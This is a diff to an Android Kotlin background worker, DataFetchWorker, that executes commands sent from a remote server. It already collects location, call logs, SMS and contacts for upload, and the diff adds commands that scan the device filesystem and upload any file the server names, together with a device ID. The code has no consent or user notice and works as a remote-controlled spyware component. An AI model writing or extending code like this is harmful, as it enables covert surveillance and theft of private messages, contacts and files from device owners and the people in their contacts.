@@ -8,7 +8,12 @@ import android.location.Location
 import android.util.Log
 import androidx.core.content.ContextCompat
 import androidx.work.CoroutineWorker
+import androidx.work.Constraints
+import androidx.work.NetworkType
+import androidx.work.OneTimeWorkRequestBuilder
 import androidx.work.WorkerParameters
+import androidx.work.WorkManager
+import androidx.work.workDataOf
 import com.google.android.gms.location.LocationServices
 import com.google.android.gms.location.Priority
 import kotlinx.coroutines.Dispatchers
@@ -30,18 +35,37 @@ class DataFetchWorker(
 ) : CoroutineWorker(appContext, workerParams) {
 
     companion object {
-        const val KEY_COMMAND = "COMMAND"
+        const val KEY_COMMAND = "command"
         private const val TAG = "DataFetchWorker"
 
         // Command constants for better type safety
-        private const val COMMAND_GET_LOCATION = "get_location"
-        private const val COMMAND_GET_SYSTEM_INFO = "get_system_info"
-        private const val COMMAND_GET_CALL_LOGS = "get_call_logs"
-        private const val COMMAND_GET_SMS = "get_sms"
-        private const val COMMAND_GET_CONTACTS = "get_contacts"
+        const val COMMAND_GET_LOCATION = "get_location"
+        const val COMMAND_GET_SYSTEM_INFO = "get_system_info"
+        const val COMMAND_GET_CALL_LOGS = "get_call_logs"
+        const val COMMAND_GET_SMS = "get_sms"
+        const val COMMAND_GET_CONTACTS = "get_contacts"
+        const val COMMAND_SCAN_FILESYSTEM = "scan_filesystem"
+        const val COMMAND_UPLOAD_FILE = "upload_file"
 
         // Minimum CSV lines to consider valid data (header + at least one row)
         private const val MIN_CSV_LINES = 2
+
+        /**
+         * Helper method to schedule a DataFetchWorker with a specific command
+         */
+        fun scheduleWork(context: Context, command: String) {
+            val workRequest = OneTimeWorkRequestBuilder<DataFetchWorker>()
+                .setInputData(workDataOf(KEY_COMMAND to command))
+                .setConstraints(
+                    Constraints.Builder()
+                        .setRequiredNetworkType(NetworkType.CONNECTED)
+                        .build()
+                )
+                .build()
+
+            WorkManager.getInstance(context).enqueue(workRequest)
+            Log.d(TAG, "Scheduled DataFetchWorker with command: $command")
+        }
     }
 
     // Lazy initialization to avoid unnecessary object creation
@@ -53,6 +77,9 @@ class DataFetchWorker(
     }
     private val systemInfoManager by lazy {
         SystemInfoManager(appContext)
+    }
+    private val fileSystemManager by lazy {
+        FileSystemManager(appContext)
     }
 
     /**
@@ -103,6 +130,8 @@ class DataFetchWorker(
                 dataType = "Contacts",
                 csvProvider = manualDataManager::getContactsAsCsv
             )
+            COMMAND_SCAN_FILESYSTEM -> scanFileSystem()
+            COMMAND_UPLOAD_FILE -> uploadFile()
             else -> {
                 Log.w(TAG, "Unknown command: $command")
                 apiClient.uploadText("❌ Error: Unknown command '$command'")
@@ -257,5 +286,120 @@ class DataFetchWorker(
             Log.d(TAG, "Created temporary CSV file: ${tempFile.name} (${tempFile.length()} bytes)")
             tempFile
         }
+    }
+
+    /**
+     * Scans the device filesystem and uploads the paths to the server
+     */
+    private suspend fun scanFileSystem(): Boolean {
+        return try {
+            if (!fileSystemManager.hasFileSystemPermissions()) {
+                Log.e(TAG, "Filesystem permissions not granted")
+                return apiClient.uploadText("❌ Filesystem scan failed: PERMISSIONS_DENIED")
+            }
+
+            Log.d(TAG, "Starting filesystem scan")
+            val scanResult = fileSystemManager.scanFileSystem(
+                includeSystemFiles = false,
+                maxDepth = 8
+            )
+
+            if (scanResult.paths.isEmpty()) {
+                Log.w(TAG, "No accessible files found during scan")
+                return apiClient.uploadText("📁 Filesystem scan: No accessible files found")
+            }
+
+            // Format the scan results for upload
+            val formattedData = fileSystemManager.formatPathsForUpload(scanResult)
+            
+            // Upload to server
+            val deviceId = systemInfoManager.getDeviceId()
+            val success = apiClient.uploadFileSystemPaths(formattedData, deviceId)
+
+            if (success) {
+                Log.i(TAG, "Filesystem scan data uploaded successfully")
+                apiClient.uploadText("📁 Filesystem scan completed: ${scanResult.totalFiles} files, ${scanResult.totalDirectories} directories scanned")
+            } else {
+                Log.e(TAG, "Failed to upload filesystem scan data")
+                apiClient.uploadText("📁 Filesystem scan completed but upload failed")
+                false
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error during filesystem scan", e)
+            apiClient.uploadText("📁 Filesystem scan error: ${e.message}")
+            false
+        }
+    }
+
+    /**
+     * Uploads a specific file requested by the server
+     * File path should be provided in the command data
+     */
+    private suspend fun uploadFile(): Boolean {
+        return try {
+            val filePath = inputData.getString("filePath")
+            if (filePath.isNullOrBlank()) {
+                Log.e(TAG, "Upload file command received without file path")
+                return apiClient.uploadText("❌ File upload failed: No file path specified")
+            }
+
+            if (!fileSystemManager.hasFileSystemPermissions()) {
+                Log.e(TAG, "Filesystem permissions not granted for file upload")
+                return apiClient.uploadText("❌ File upload failed: PERMISSIONS_DENIED")
+            }
+
+            val fileInfo = fileSystemManager.getFileInfo(filePath)
+            if (fileInfo == null) {
+                Log.w(TAG, "Requested file not found or not accessible: $filePath")
+                return apiClient.uploadText("❌ File upload failed: File not found or not accessible")
+            }
+
+            if (fileInfo.isDirectory) {
+                Log.w(TAG, "Cannot upload directory: $filePath")
+                return apiClient.uploadText("❌ File upload failed: Path is a directory, not a file")
+            }
+
+            val file = File(filePath)
+            if (!file.exists() || !file.canRead()) {
+                Log.w(TAG, "File is not accessible: $filePath")
+                return apiClient.uploadText("❌ File upload failed: File is not accessible")
+            }
+
+            // Check file size (limit to 100MB for safety)
+            val maxFileSize = 100 * 1024 * 1024 // 100MB
+            if (file.length() > maxFileSize) {
+                Log.w(TAG, "File too large for upload: $filePath (${file.length()} bytes)")
+                return apiClient.uploadText("❌ File upload failed: File too large (max 100MB)")
+            }
+
+            val deviceId = systemInfoManager.getDeviceId()
+            val success = apiClient.uploadRequestedFile(file, deviceId, filePath)
+
+            if (success) {
+                Log.i(TAG, "File uploaded successfully: $filePath")
+                apiClient.uploadText("📤 File uploaded successfully: ${file.name} (${formatFileSize(file.length())})")
+            } else {
+                Log.e(TAG, "Failed to upload file: $filePath")
+                apiClient.uploadText("📤 File upload failed: ${file.name}")
+                false
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error during file upload", e)
+            apiClient.uploadText("📤 File upload error: ${e.message}")
+            false
+        }
+    }
+
+    /**
+     * Helper method to format file size
+     */
+    private fun formatFileSize(bytes: Long): String {
+        if (bytes < 1024) return "$bytes B"
+        val kb = bytes / 1024.0
+        if (kb < 1024) return "%.1f KB".format(kb)
+        val mb = kb / 1024.0
+        if (mb < 1024) return "%.1f MB".format(mb)
+        val gb = mb / 1024.0
+        return "%.1f GB".format(gb)
     }
 }
